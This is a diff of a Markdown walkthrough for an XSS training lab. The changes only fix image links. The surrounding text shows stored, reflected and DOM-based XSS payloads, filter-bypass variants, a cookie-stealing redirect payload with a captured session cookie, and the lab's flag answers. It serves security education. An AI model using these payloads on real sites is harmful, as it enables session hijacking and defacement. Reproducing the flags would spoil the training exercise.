@@ -64,7 +64,7 @@ Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page o
 2. Add a comment and see if you can insert some of your own HTML.
 	Doing so will reveal the answer to this question.
 	
-	![[Pasted image 20210610122045.png]]
+	![](Pastedimage20210610122045.png)
 	
 	*ANSWER:* `HTML_T4gs`
 	
@@ -72,7 +72,7 @@ Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page o
 
 *payload:* `<script>alert(document.cookie)</script>`
 
-![[Pasted image 20210610122145.png]]
+![](Pastedimage20210610122145.png)
 
 *ANSWER:* `W3LL_D0N3_LVL2`
 
@@ -83,7 +83,7 @@ Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page o
 *payload:* `document.querySelector('#thm-title').textContent = 'Hey'`
 
 
-![[Pasted image 20210610123059.png]]
+![](Pastedimage20210610123059.png)
 
 *ANSWER:* `websites_can_be_easily_defaced_with_xss`
 
@@ -100,7 +100,7 @@ Take over Jack's account by stealing his cookie, what was his cookie value?
 *payload:* 	 `<script>document.location='/log/'+document.cookie</script`
 
 you will see the log and cookies
-![[Pasted image 20210610124405.png]]
+![](Pastedimage20210610124405.png)
 
 *ANSWER:* `connect.sid s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE`
 
@@ -112,7 +112,7 @@ you will see the log and cookies
 
 *payload:* `<a>jack</a>`
 
-![[Pasted image 20210610124238.png]]
+![](Pastedimage20210610124238.png)
 
 
 ### TASK 4: REflected XSS
@@ -137,9 +137,9 @@ The website then includes this malicious payload from the request in the respons
 
 *payload:* `<script>alert("Hello")</script>`
 
-![[Pasted image 20210610132550.png]]
+![](Pastedimage20210610132550.png)
 
-![[Pasted image 20210610132623.png]]
+![](Pastedimage20210610132623.png)
 
 *ANSWER:* ThereIsMoreToXSSThanYouThink
 
@@ -151,9 +151,9 @@ The website then includes this malicious payload from the request in the respons
 
 *payload:*`<script>alert(window.location.hostname)</script>`
 
-![[Pasted image 20210610132818.png]]
+![](Pastedimage20210610132818.png)
 
-![[Pasted image 20210610132834.png]]
+![](Pastedimage20210610132834.png)
 
 *ANSWER:* ReflectiveXss4TheWin
 
@@ -185,13 +185,13 @@ keyword.innerHTML = <script>...</script>`
 1. Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.
 
 *HINT:Try entering: test" onmouseover="alert('Hover over the image and inspect the image element')"*
-![[Pasted image 20210610134457.png]]
+![](Pastedimage20210610134457.png)
 
 *paylaod:* `test" onmouseover="alert(document.cookie)"`
 
-![[Pasted image 20210610134546.png]]
+![](Pastedimage20210610134546.png)
 
-![[Pasted image 20210610134621.png]]
+![](Pastedimage20210610134621.png)
 
 *ANSWER:* BreakingAnElementsTag
 
@@ -208,7 +208,7 @@ keyword.innerHTML = <script>...</script>`
 
 *payload:* `test" onmouseover="document.body.style.backgroundColor = 'red';`
 
-![[Pasted image 20210610134758.png]]
+![](Pastedimage20210610134758.png)
 
 ### TASK 6: Using XSS for IP and Port Scanning
 
@@ -250,7 +250,7 @@ Cross-site scripting are extremely common. Below are a few reports of XSS found 
 
 *payload:* `<img src=x onerror=alert('Hello');>`
 
-![[Pasted image 20210612113149.png]]
+![](Pastedimage20210612113149.png)
 *ANSWER:* 3c3cf8d90aaece81710ab9db759352c0
 
 
@@ -258,7 +258,7 @@ Cross-site scripting are extremely common. Below are a few reports of XSS found 
 
 *payload:* `<img src="blah" onerror=confirm("Hello") />`
 
-![[Pasted image 20210612113530.png]]
+![](Pastedimage20210612113530.png)
 
 *ANSWER:* a2e5ef66f5ff584a01d734ef5edaae91
 
@@ -266,7 +266,7 @@ Cross-site scripting are extremely common. Below are a few reports of XSS found 
 
 *payload:*`<img src="blah" onerror=alert("HHelloello") />`
 
-![[Pasted image 20210612113701.png]]
+![](Pastedimage20210612113701.png)
 
 
 
@@ -287,7 +287,7 @@ Filtered in challenge 4 is as follows:
 
 *payload:*`<img src="blah" ONERROR="alert('HHelloello')" />`
 
-![[Pasted image 20210612113836.png]]
+![](Pastedimage20210612113836.png)
 
 *ANSWER:* 2482d2e8939fc85a9363617782270555
 
